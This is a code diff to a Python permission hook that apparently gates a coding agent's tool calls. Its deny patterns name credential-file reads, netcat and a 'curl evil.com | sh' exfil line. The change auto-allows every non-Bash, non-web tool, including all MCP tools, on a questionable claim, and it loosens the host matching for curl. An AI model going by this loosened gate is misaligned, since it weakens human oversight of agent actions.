@@ -60,31 +60,36 @@ __all__ = ["decide", "main"]
 # ----------------------------------------------------------------------
 
 
-# File-edit + read tools that Claude Code already scopes to the project
-# directory by default. Allowing without a Bash-level inspection keeps
-# the agent unblocked on every Read/Edit/Write.
-_ALLOW_TOOLS = frozenset({
-    "Read",
-    "Edit",
-    "Write",
-    "MultiEdit",
-    "Glob",
-    "Grep",
-    "NotebookEdit",
-    "NotebookRead",
-    "TodoWrite",
-})
-
-
 # Tools that reach the network or external services in unbounded ways.
 # Better to surface a prompt than to risk auto-allowing a fetch to a
 # malicious URL — even though the agent rarely needs these.
 _ASK_TOOLS = frozenset({
     "WebFetch",
     "WebSearch",
-    "Task",
-    "Agent",
 })
+
+
+# Default policy for non-Bash, non-Web tools is ALLOW.
+#
+# Why an allow-by-default for non-Bash:
+#   Claude Code ships dozens of internal tools — TaskCreate /
+#   TaskUpdate / TaskList / TaskGet / TaskStop, Read / Edit / Write /
+#   MultiEdit / Glob / Grep / NotebookEdit / NotebookRead, Skill,
+#   ToolSearch, EnterPlanMode / ExitPlanMode, Agent / Task,
+#   AskUserQuestion, SlashCommand, BashOutput / KillShell,
+#   ScheduleWakeup, EnterWorktree / ExitWorktree, Monitor,
+#   PushNotification / RemoteTrigger / SendMessage, CronCreate /
+#   CronDelete / CronList, plus every ``mcp__<server>__<tool>``.
+#   None of these escape the agent's process — they're LLM-bounded
+#   and either touch files inside the repo (Edit/Write), surface
+#   structured UI to the user (AskUserQuestion), or coordinate
+#   between agents (Agent/Task). Enumerating them in an allowlist
+#   gets stale as Claude Code adds tools; an inverse "everything
+#   except Bash + WebFetch/WebSearch is fine" is robust to that.
+#
+# The dangerous surface is `Bash` (arbitrary OS commands) and the
+# web-reaching tools (data exfil / malicious payload risk). Both
+# are gated explicitly below.
 
 
 # ----------------------------------------------------------------------
@@ -128,13 +133,22 @@ _DENY_PATTERNS: list[tuple[re.Pattern[str], str]] = [
     (re.compile(r"(^|\s)(cat|less|more|head|tail|cp|mv|tar|zip)\s[^|;]*~/\.config/gh/"), "reads/copies gh creds"),
     (re.compile(r"\.git-credentials\b"), "git-credentials file"),
     # ---------- network exfil ----------
-    # curl/wget to arbitrary external. We allow github.com explicitly
-    # because many setup steps legitimately fetch from there; everything
-    # else falls into deny so the LLM can't `curl evil.com | sh`.
+    # curl/wget to arbitrary external hosts. We allow:
+    #   * github.com + githubusercontent.com (release archives, etc.)
+    #   * localhost / 127.0.0.1 / [::1] / *.local — dev servers,
+    #     test endpoints, container loopback.
+    # Everything else falls into deny so the LLM can't
+    # `curl evil.com | sh`.
     (
         re.compile(
             r"(^|[\s;&|])curl\b[^|;]*\bhttps?://"
             r"(?!"
+            # localhost variants
+            r"localhost(:\d+)?[/\s]|"
+            r"127\.0\.0\.1(:\d+)?[/\s]|"
+            r"\[::1\](:\d+)?[/\s]|"
+            r"[a-zA-Z0-9.-]+\.local(:\d+)?[/\s]|"
+            # GitHub
             r"github\.com|"
             r"api\.github\.com|"
             r"raw\.githubusercontent\.com|"
@@ -143,7 +157,7 @@ _DENY_PATTERNS: list[tuple[re.Pattern[str], str]] = [
             r"uploads\.github\.com"
             r")",
         ),
-        "curl to non-GitHub URL",
+        "curl to non-GitHub, non-localhost URL",
     ),
     (re.compile(r"(^|[\s;&|])wget\b"), "wget (use gh / curl-to-github instead)"),
     (re.compile(r"(^|[\s;&|])nc\s"), "netcat"),
@@ -215,16 +229,18 @@ _ALLOW_FIRST_TOKEN_REGEX: list[re.Pattern[str]] = [
     # inner command's first token will be checked separately when we
     # split on shell operators; for xargs alone we allow the wrapper.
     re.compile(r"^xargs\b"),
-    # curl is denied to non-GitHub hosts (deny patterns above) but
-    # is legitimately useful for fetching from GitHub itself
-    # (release archives, raw content, etc.). The positive form here
-    # matches only github.com / githubusercontent.com hosts so the
-    # deny patterns + this allow form together cover both directions.
+    # curl is denied to non-GitHub, non-localhost hosts (deny patterns
+    # above). The positive form here matches the safe targets:
+    #   * GitHub family (release archives, raw content)
+    #   * localhost / 127.0.0.1 / [::1] / *.local (dev servers, the
+    #     fix's own healthcheck endpoint, container loopback).
     re.compile(
         r"^curl\b[^|;]*\bhttps?://"
         r"(github\.com|api\.github\.com|raw\.githubusercontent\.com|"
         r"objects\.githubusercontent\.com|codeload\.github\.com|"
-        r"uploads\.github\.com)/"
+        r"uploads\.github\.com|"
+        r"localhost(:\d+)?|127\.0\.0\.1(:\d+)?|\[::1\](:\d+)?|"
+        r"[a-zA-Z0-9.-]+\.local(:\d+)?)"
     ),
 ]
 
@@ -318,8 +334,48 @@ _ALLOW_TOOLCHAIN_FIRST_TOKEN: frozenset[str] = frozenset({
     "shfmt", "yamllint", "markdownlint", "actionlint",
     # Container / k8s tooling — read-only or local-only
     "docker", "podman", "kubectl", "helm", "kind", "k3d",
+    "docker-compose",
     # Documentation
     "mkdocs", "sphinx-build", "asciidoctor", "pandoc",
+    # Database CLI clients — overwhelmingly used to read state /
+    # apply migrations / inspect schema during a fix. Networked DBs
+    # are bounded by the user's existing connection strings (which
+    # the deny patterns above don't touch); local DBs are local.
+    "psql", "pg_dump", "pg_restore", "pg_isready", "pgcli",
+    "mysql", "mysqldump", "mysqladmin", "mycli",
+    "mongo", "mongosh", "mongodump", "mongorestore", "mongoexport",
+    "mongoimport",
+    "redis-cli", "redis-server",
+    "sqlite3", "litecli",
+    "sqlcmd", "mssql-cli",
+    "clickhouse-client", "clickhouse",
+    "cqlsh",  # Cassandra
+    "influx", "influxd",
+    "duckdb",
+    # Web / dev servers and process managers — running the project
+    # under test is part of fixing it.
+    "flask", "gunicorn", "uvicorn", "hypercorn", "daphne",
+    "rails", "bin/rails", "bundle",
+    "rackup", "puma",
+    "nodemon", "pm2", "forever",
+    "next", "nuxt", "gatsby", "vite", "remix", "astro",
+    "webpack", "webpack-cli", "parcel", "rollup", "esbuild",
+    "tailwindcss",
+    "wrangler",  # Cloudflare Workers
+    "fly",  # fly.io
+    "supabase", "convex", "drizzle-kit", "prisma",
+    # Migration / orchestration helpers (django manage.py is run via
+    # `python manage.py`, which is already covered by the "python"
+    # entry above; same for `npm run migrate`).
+    "alembic", "flyway", "liquibase",
+    # Generic file movers commonly used in fix workflows
+    "rsync",  # local rsync; deny patterns block remote `::` form
+    "cp", "mv",  # already used inside deny patterns to GATE the
+    # exfil rules, but allowing the verbs here covers benign
+    # in-repo file moves (e.g. moving a renamed file).
+    "mkdir", "rmdir", "touch", "ln",
+    # tmux / screen sessions occasionally used to babysit dev servers
+    "tmux", "screen",
 })
 
 
@@ -474,17 +530,17 @@ def decide(tool_name: str, tool_input: dict[str, Any]) -> tuple[str, str]:
     if not tool_name:
         return "ask", "missing tool name"
 
-    if tool_name in _ALLOW_TOOLS:
-        return "allow", f"safe tool ({tool_name})"
-
-    if tool_name.startswith("mcp__github-issue-agent__"):
-        return "allow", "github-issue-agent's own MCP tool"
-
+    # Web-reaching tools always ask. They could exfil data or pull in
+    # a malicious payload that the LLM then acts on.
     if tool_name in _ASK_TOOLS:
-        return "ask", f"unbounded tool ({tool_name}) — surface to user"
+        return "ask", f"web-reaching tool ({tool_name}) — surface to user"
 
+    # Bash gets full command analysis below.
     if tool_name != "Bash":
-        return "ask", f"unknown tool ({tool_name})"
+        # Every other tool is LLM-bounded — TaskCreate, Read, Edit,
+        # Glob, Grep, AskUserQuestion, every mcp__*, every internal
+        # Claude Code tool. Auto-allow rather than enumerate.
+        return "allow", f"LLM-bounded tool ({tool_name})"
 
     command = (tool_input or {}).get("command")
     if not isinstance(command, str) or not command.strip():
